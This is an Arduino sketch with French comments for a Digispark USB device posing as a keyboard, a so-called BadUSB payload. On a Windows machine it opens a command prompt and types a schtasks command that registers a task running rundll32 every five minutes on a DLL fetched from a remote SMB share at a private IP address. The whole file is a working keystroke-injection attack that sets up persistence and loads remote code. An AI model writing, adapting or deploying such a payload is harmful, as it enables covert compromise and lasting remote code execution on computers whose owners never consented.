#include <DigiKeyboardFr.h>

void setup() {
  // Attendre quelques secondes au démarrage
  

}
void loop(){

  delay(5000);
  
  // Appuyer sur la touche Windows (GUI) et la maintenir enfoncée
  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);

  // Attendre un peu
  delay(500);

  // Relâcher la touche Windows (GUI)
  DigiKeyboardFr.sendKeyPress(0);

  // Attendre un peu
  delay(500);

  // Envoyer "cmd" (Command Prompt) suivi de la touche Entrée
  DigiKeyboardFr.print("cmd");
  DigiKeyboardFr.sendKeyPress(KEY_ENTER);

  // Attendre un peu
  delay(500); // Attendez suffisamment pour que la fenêtre cmd soit ouverte

  // Envoyer la commande schtasks pour créer la tâche planifiée
  DigiKeyboardFr.print("schtasks /create /tn \"MyCustomTask\" /tr \"cmd /c rundll32.exe \\192.168.88.128\LnYVN\test.dll,0\" /sc minute /mo 5");
  DigiKeyboardFr.sendKeyPress(KEY_ENTER);


  // Attendre un peu
  delay(100);
  DigiKeyboardFr.print("exit");
  DigiKeyboardFr.sendKeyPress(KEY_ENTER);

   // Envoyer Alt + F4 plusieurs fois
 

  // Terminer le programme
  DigiKeyboardFr.sendKeyPress(0);
}